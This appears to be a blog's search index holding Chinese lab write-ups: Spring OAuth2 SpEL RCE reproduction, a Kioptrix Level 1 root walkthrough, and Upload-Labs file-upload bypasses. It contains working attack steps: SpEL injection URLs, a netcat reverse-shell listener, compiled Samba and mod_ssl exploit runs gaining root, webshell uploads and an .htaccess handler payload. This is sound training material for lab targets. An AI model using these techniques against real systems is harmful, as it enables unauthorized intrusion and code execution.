<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vulhub-Spring复现</title>
    <link href="/2020/10/25/vulhub-Spring%E5%A4%8D%E7%8E%B0/"/>
    <url>/2020/10/25/vulhub-Spring%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="Spring-Security-OAuth2-远程命令执行漏洞（CVE-2016-4977）"><a href="#Spring-Security-OAuth2-远程命令执行漏洞（CVE-2016-4977）" class="headerlink" title="Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）"></a>Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）</h2><p>&nbsp;&nbsp;Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p><p>&nbsp;&nbsp;目标ip：192.168.1.130</p><p>&nbsp;&nbsp;访问<a href="http://192.168.1.130:8080/oauth/authorize?response\_type=${233*233}&amp;client\_id=acme&amp;scope=openid&amp;redirect_uri=http://test" target="_blank" rel="noopener">http://192.168.1.130:8080/oauth/authorize?response\_type=${233*233}&amp;client\_id=acme&amp;scope=openid&amp;redirect_uri=http://test</a></p><p><img src="https://i.loli.net/2020/10/25/7GxLTnEmfdDobPr.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;可以发现233*233运行，证明可以交互，进行反弹shell，注意java反弹shell需要进行编码 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">链接</a></p><p><img src="https://i.loli.net/2020/10/25/47asy9wgQP6tlLH.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;然后利用python脚本生成poc</p><p><img src="https://i.loli.net/2020/10/25/8MqzbUhATntYc7B.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;kalibash监听</p><pre><code>root@kali:~# nc -lvvp 8888</code></pre><p>&nbsp;&nbsp;poc填入response_type，接收到反弹shell</p><p><img src="https://i.loli.net/2020/10/25/KIUrRWGoZxDnAM7.png" srcset="/img/loading.gif" alt=""></p><h2 id="Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）"><a href="#Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="headerlink" title="Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）"></a>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</h2><p>&nbsp;&nbsp;Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><p>&nbsp;&nbsp;在此处点击confirm</p><p><img src="https://i.loli.net/2020/10/25/1kEsYpVgXjwObZv.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kioptix Level 1</title>
    <link href="/2020/10/18/Kioptix-Level-1/"/>
    <url>/2020/10/18/Kioptix-Level-1/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>&nbsp;&nbsp;This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p><p>&nbsp;&nbsp;该靶机来自vulnhub，部署在VMware上</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>&nbsp;&nbsp;靶机登录无提供用户名密码，需要自己解决</p><p>&nbsp;&nbsp;nmap先找靶机ip</p><pre><code>nmap -sP 192.168.1.135/24//本机//扫描结果Nmap scan report for 192.168.1.104Host is up (0.00012s latency).MAC Address: 00:0C:29:FE:5E:95 (VMware)</code></pre><p>&nbsp;&nbsp;找到靶机，nmap继续扫，顺便扫扫目录</p><pre><code>nmap -sV -T4 -A 192.168.1.104//扫描结果22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)| ssh-hostkey: |   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)|_sshv1: Server supports SSHv180/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-title: Test Page for the Apache Web Server on Red Hat Linux111/tcp  open  rpcbind     2 (RPC #100000)139/tcp  open  netbios-ssn Samba smbd (workgroup: nMYGROUP)443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b|_http-title: 400 Bad Request|_ssl-date: 2020-10-18T07:54:27+00:00; +1m49s from scanner time.| sslv2: |   SSLv2 supported|   ciphers: |     SSL2_RC2_128_CBC_WITH_MD5|     SSL2_RC4_64_WITH_MD5|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5|     SSL2_DES_192_EDE3_CBC_WITH_MD5|     SSL2_RC4_128_EXPORT40_WITH_MD5|     SSL2_RC4_128_WITH_MD5|_    SSL2_DES_64_CBC_WITH_MD51024/tcp open  status      1 (RPC #100024)//看到使用了samba和mod_ssl</code></pre><p>&nbsp;&nbsp;登录靶机网站是个测试界面，wappalyzer也看不出啥，目录扫出了几个但没啥思路</p><pre><code>==&gt; DIRECTORY: http://192.168.1.104/manual/                                                                                                 ==&gt; DIRECTORY: http://192.168.1.104/mrtg/                                                                                                   ==&gt; DIRECTORY: http://192.168.1.104/usage/ </code></pre><p>&nbsp;&nbsp;先确定samba的版本来找exp</p><p>&nbsp;&nbsp;进入msf用smb_version工具来判断版本</p><pre><code>msf5 &gt; use auxiliary/scanner/smb/smb_version msf5 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.1.104RHOSTS =&gt; 192.168.1.104msf5 auxiliary(scanner/smb/smb_version) &gt; run[*] 192.168.1.104:139     - Host could not be identified: Unix (Samba 2.2.1a)[*] 192.168.1.104:445     - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><h2 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h2><pre><code>root@kali:~/桌面# searchsploit samba 2.2.1.a----------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                           |  Path----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                             | osx/remote/9924.rbSamba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                        | multiple/remote/10.cSamba &lt; 3.0.20 - Remote Heap Overflow                                                                                                    | linux/remote/7701.txtSamba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                                            | linux_x86/dos/36741.py----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results</code></pre><p>&nbsp;&nbsp;这里samba选择Remote Code Execution这个版本的exp</p><p>&nbsp;&nbsp;再看看另一个mod_ssl/2.8.4用的exp</p><pre><code>----------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                             |  Path----------------------------------------------------------------------------------------------------------- ---------------------------------Apache mod_ssl 2.0.x - Remote Denial of Service                                                            | linux/dos/24590.txtApache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                 | multiple/dos/21575.txtApache mod_ssl &lt; 2.8.7 OpenSSL - &apos;OpenFuck.c&apos; Remote Buffer Overflow                                       | unix/remote/21671.cApache mod_ssl &lt; 2.8.7 OpenSSL - &apos;OpenFuckV2.c&apos; Remote Buffer Overflow (1)                                 | unix/remote/764.cApache mod_ssl &lt; 2.8.7 OpenSSL - &apos;OpenFuckV2.c&apos; Remote Buffer Overflow (2)                                 | unix/remote/47080.cApache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &apos;openssl-too-open.c&apos; SSL2 KEY_ARG Overflow               | unix/remote/40347.txt----------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results</code></pre><p>&nbsp;&nbsp;这里使用OpenSSL - ‘OpenFuckV2.c’ Remote Buffer Overflow (2) 来进行</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="samba"><a href="#samba" class="headerlink" title="samba"></a>samba</h3><p>&nbsp;&nbsp;gcc编译看看exp怎么用</p><pre><code>root@kali:~/桌面/samba# gcc 10.c -o sambaroot@kali:~/桌面/samba# ./samba samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)--------------------------------------------------------------Usage: ./samba [-bBcCdfprsStv] [host]-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)-B &lt;step&gt;       bruteforce steps (default = 300)-c &lt;ip address&gt; connectback ip address-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)-f              force-p &lt;port&gt;       port to attack (default = 139)-r &lt;ret&gt;        return address-s              scan mode (random)-S &lt;network&gt;    scan mode-t &lt;type&gt;       presets (0 for a list)-v              verbose mode</code></pre><p>&nbsp;&nbsp;启动</p><pre><code>root@kali:~/桌面/samba# ./samba -b=0 -c 192.168.1.135 192.168.1.104samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)--------------------------------------------------------------+ Bruteforce mode. (Linux)+ Host is running samba.+ Worked!--------------------------------------------------------------*** JE MOET JE MUIL HOUWELinux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknownuid=0(root) gid=0(root) groups=99(nobody)</code></pre><p>&nbsp;&nbsp;特别流畅的就完成了，看一下权限</p><p><img src="https://i.loli.net/2020/10/18/Ituoh94TlSMFzG5.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;再按照提示里面的看看email</p><p><img src="https://i.loli.net/2020/10/18/bAmwdMi6q2CDa4Z.png" srcset="/img/loading.gif" alt=""></p><h3 id="mod-ssl"><a href="#mod-ssl" class="headerlink" title="mod_ssl"></a>mod_ssl</h3><p>&nbsp;&nbsp;像上面的进行编译发现缺少头文件，记录一下怎么做</p><pre><code>sudo apt-get install apt-filesudo apt-file updateapt-file search &quot;报错内容&quot;//这里缺的是libxtst-devsudo apt-get install libxtst-dev//即可</code></pre><p>&nbsp;&nbsp;继续编译</p><pre><code>gcc 47080.c -o mod_ssl -lcrypto//编译前需要看看源文件才知道加-lcrypto</code></pre><p>&nbsp;&nbsp;跑一下看看需要什么参数</p><pre><code>******************************************************************** OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open ********************************************************************* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE ** #hackarena  irc.brasnet.org                                     ** TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname ** #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam ** #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ ********************************************************************: Usage: ./mod_ssl target box [port] [-c N]  target - supported box eg: 0x00  box - hostname or IP address  port - port for ssl connection  -c open N connections. (use range 40-50 if u dont know)</code></pre><p>&nbsp;&nbsp;下面就是一堆机器os和服务版本对应的序列，这里只能找到apache对应两个版本 0x6a和0x6b 都跑跑</p><pre><code>./mod_ssl 0x6a 192.168.1.104 -c 50//失败./mod_ssl 0x6b 192.168.1.104 -c 50//成功</code></pre><p><img src="https://i.loli.net/2020/10/18/QxRwHmKOIq1Mcn9.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload-Labs靶场</title>
    <link href="/2020/09/10/Upload-Labs%E9%9D%B6%E5%9C%BA/"/>
    <url>/2020/09/10/Upload-Labs%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="简介和安装"><a href="#简介和安装" class="headerlink" title="简介和安装"></a>简介和安装</h2><p>&nbsp;&nbsp;upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">源码地址</a></p><p>&nbsp;&nbsp;可以采用windows或linux下的docker安装，这里采用了dockers</p><h2 id="通关手册"><a href="#通关手册" class="headerlink" title="通关手册"></a>通关手册</h2><h3 id="nbsp-nbsp-Pass-01"><a href="#nbsp-nbsp-Pass-01" class="headerlink" title="&nbsp;&nbsp;Pass-01"></a>&nbsp;&nbsp;Pass-01</h3><p>&nbsp;&nbsp;尝试直接上传小马</p><p><img src="https://i.loli.net/2020/09/10/HlS9LbjrZmeWkVt.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;查看JS 过滤是在客户端来进行的</p><pre><code>&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;</code></pre><p>&nbsp;&nbsp;在审查元素内将checkfile函数删除</p><p><img src="https://i.loli.net/2020/09/10/Q9S7TxwtJDN25FA.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;上传成功尝试连接webshell</p><p><img src="https://i.loli.net/2020/09/10/JNYcOyPvMGeaTC7.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;看看源码</p><pre><code>function checkFile() {var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;if (file == null || file == &quot;&quot;) {    alert(&quot;请选择要上传的文件!&quot;);    return false;}//定义允许上传的文件类型var allow_ext = &quot;.jpg|.png|.gif&quot;;//提取上传文件的类型var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));//判断上传文件类型是否允许上传if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {    var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;    alert(errMsg);    return false;}}</code></pre><p>&nbsp;&nbsp;在客户端的检查同样可以通过在提前将webshell修改成符合标准的后缀 再通过burpsuite改上传后缀即可</p><p><img src="https://i.loli.net/2020/09/10/aqbFjBeWrw5EhSO.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-Pass-02"><a href="#nbsp-nbsp-Pass-02" class="headerlink" title="&nbsp;&nbsp;Pass-02"></a>&nbsp;&nbsp;Pass-02</h3><p>&nbsp;&nbsp;抓包修改后缀的方式这关也可以实现 不过本关从源码上看是应该考虑content-type的绕过</p><pre><code>if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;))//对一些函数简单说明一下，$_FILES[&apos;myFile&apos;][&apos;name&apos;] 客户端文件的原名称。 $_FILES[&apos;myFile&apos;][&apos;type&apos;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 $_FILES[&apos;myFile&apos;][&apos;size&apos;] 已上传文件的大小，单位为字节。 $_FILES[&apos;myFile&apos;][&apos;tmp_name&apos;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。</code></pre><p>&nbsp;&nbsp;burpsuite抓包修改即可</p><p><img src="https://i.loli.net/2020/09/10/KvrAJ9fsqmUaXjh.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-Pass-03"><a href="#nbsp-nbsp-Pass-03" class="headerlink" title="&nbsp;&nbsp;Pass-03"></a>&nbsp;&nbsp;Pass-03</h3><p>&nbsp;&nbsp;本关是对上传的文件后缀进行黑名单处理</p><pre><code>if (file_exists(UPLOAD_PATH)) {$deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;);$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);$file_name = deldot($file_name);//删除文件名末尾的点$file_ext = strrchr($file_name, &apos;.&apos;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //收尾去空if(!in_array($file_ext, $deny_ext)) {    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; </code></pre><p>&nbsp;&nbsp;通过源码可以了解设置了黑名单对 .jsp .php .asp .aspx ，但没有对 .phtml .phps .php5 .pht 进行过滤，同时还会修改文件名</p><p>&nbsp;&nbsp;要求apache的httpd.conf 包含 AddType application/x-httpd-php .php .phtml .phps .php5 .pht</p><h3 id="nbsp-nbsp-Pass-04"><a href="#nbsp-nbsp-Pass-04" class="headerlink" title="&nbsp;&nbsp;Pass-04"></a>&nbsp;&nbsp;Pass-04</h3><p>&nbsp;&nbsp;这关对黑名单内后缀进行了增加，但未对.htaccess进行过滤</p><pre><code>if (file_exists(UPLOAD_PATH)) {    $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</code></pre><p>&nbsp;&nbsp;先上传一个 .htaccess 后缀文件，内容为</p><pre><code>SetHandler application/x-httpd-php //上传的文件就会当作php来解析</code></pre><p>&nbsp;&nbsp;之后将webshell后缀修改为jpg或png上传，接着就能利用了</p><p><img src="https://i.loli.net/2020/09/15/SOBwg736J4PTNMh.png" srcset="/img/loading.gif" alt="">  </p><p>&nbsp;&nbsp;前提条件是需要 1.mod_rewrite模块开启。2.AllowOverride All</p><h3 id="nbsp-nbsp-Pass-05"><a href="#nbsp-nbsp-Pass-05" class="headerlink" title="&nbsp;&nbsp;Pass-05"></a>&nbsp;&nbsp;Pass-05</h3><p>&nbsp;&nbsp;这一关过滤上一关可以使用的 .htaccess 文件</p><pre><code>if (file_exists(UPLOAD_PATH)) {    $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</code></pre><p>&nbsp;&nbsp;相比上一关过滤的函数少了一个大小写转换函数</p><pre><code>$file_ext = strtolower($file_ext); //转换为小写</code></pre><p><img src="https://i.loli.net/2020/09/15/rJyKkDPfYQCdqgc.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-Pass-06"><a href="#nbsp-nbsp-Pass-06" class="headerlink" title="&nbsp;&nbsp;Pass-06"></a>&nbsp;&nbsp;Pass-06</h3><p>&nbsp;&nbsp;相比第四关的减少空格的过滤</p><pre><code> $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //收尾去空</code></pre><p>&nbsp;&nbsp;少了收尾去空的函数，可以通过增加空格来绕过。若目标机器是Windows系统，默认会删除空格和点</p><p><img src="https://i.loli.net/2020/09/15/QdKDbu3sA2eqZfI.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-Pass-07"><a href="#nbsp-nbsp-Pass-07" class="headerlink" title="&nbsp;&nbsp;Pass-07"></a>&nbsp;&nbsp;Pass-07</h3><p>&nbsp;&nbsp;查看源码发现少了过滤点的函数</p><pre><code>if (isset($_POST[&apos;submit&apos;])) {if (file_exists(UPLOAD_PATH)) {    $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);    $file_ext = strrchr($file_name, &apos;.&apos;);    $file_ext = strtolower($file_ext); //转换为小写    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA    $file_ext = trim($file_ext); //首尾去空    //这是对比pass-04</code></pre><p>&nbsp;&nbsp;少了一个删除末尾点的函数</p><pre><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></pre><p>&nbsp;&nbsp;在文件后增加一个点即可</p><p><img src="https://i.loli.net/2020/09/15/HOmLp1GUfocVSXq.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;同时第六关和第七关内输入多个空格和点在上传时只会被过滤，从源码中也得知只进行一次的删除</p><h3 id="nbsp-nbsp-Pass-08"><a href="#nbsp-nbsp-Pass-08" class="headerlink" title="&nbsp;&nbsp;Pass-08"></a>&nbsp;&nbsp;Pass-08</h3><p>&nbsp;&nbsp;比对过滤函数少了data过滤</p><pre><code>$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</code></pre><p>&nbsp;&nbsp;可以在抓包后增加 ::$DATA 来绕过</p><p><img src="https://i.loli.net/2020/09/15/YmJOCuHndXD6bxT.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为： $ DATA 。</p><h3 id="nbsp-nbsp-Pass-09"><a href="#nbsp-nbsp-Pass-09" class="headerlink" title="&nbsp;&nbsp;Pass-09"></a>&nbsp;&nbsp;Pass-09</h3><p>&nbsp;&nbsp;对比前几关的上传部分</p><pre><code>if (!in_array($file_ext, $deny_ext)) {        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;        if (move_uploaded_file($temp_file, $img_path)) {            $is_upload = true;//前几关的if (!in_array($file_ext, $deny_ext)) {        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;        if (move_uploaded_file($temp_file, $img_path)) {            $is_upload = true;//本关</code></pre><p>&nbsp;&nbsp;本关是对前几个关卡的综合通过后缀添加 . . 来绕过之前的函数</p><p><img src="https://i.loli.net/2020/09/18/xdpYhjE3cbUDKWi.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-Pass-10"><a href="#nbsp-nbsp-Pass-10" class="headerlink" title="&nbsp;&nbsp;Pass-10"></a>&nbsp;&nbsp;Pass-10</h3><pre><code>if (file_exists(UPLOAD_PATH)) {    $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);    $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</code></pre><p>&nbsp;&nbsp;这关连之前对点空格的操作都没了，看到是用str_ireplace函数应该通过双写绕过</p><p><img src="https://i.loli.net/2020/09/18/WTMRZv2yK4VN3Sk.png" srcset="/img/loading.gif" alt=""></p><h3 id="nbsp-nbsp-Pass-11"><a href="#nbsp-nbsp-Pass-11" class="headerlink" title="&nbsp;&nbsp;Pass-11"></a>&nbsp;&nbsp;Pass-11</h3><p>&nbsp;&nbsp;本关没有通过黑名单来限制后缀，而是白名单</p><pre><code>f(isset($_POST[&apos;submit&apos;])){$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);if(in_array($file_ext,$ext_arr)){    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];    $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre><p>&nbsp;&nbsp;本关考察的更多是move_uploaded_file函数的利用，由于可控的地方是在http包的<strong>get</strong>传输save_path地方</p><p><img src="https://i.loli.net/2020/09/18/o1wZTJPNHMdfeuF.png" srcset="/img/loading.gif" alt=""></p><p>&nbsp;&nbsp;利用move_uploaded_file底层会对 %00 截断的性质，将上传的文件后缀进行可控的修改 </p><p>&nbsp;&nbsp;00截断也是需要条件：1、php版本小于5.3.4 2、php.ini的magic_quotes_gpc为OFF状态</p><h3 id="nbsp-nbsp-Pass-12"><a href="#nbsp-nbsp-Pass-12" class="headerlink" title="&nbsp;&nbsp;Pass-12"></a>&nbsp;&nbsp;Pass-12</h3><p>&nbsp;&nbsp;12关也是对move_uploaded_file的00截断进行考察，但save_path是通过post传参</p><p><img 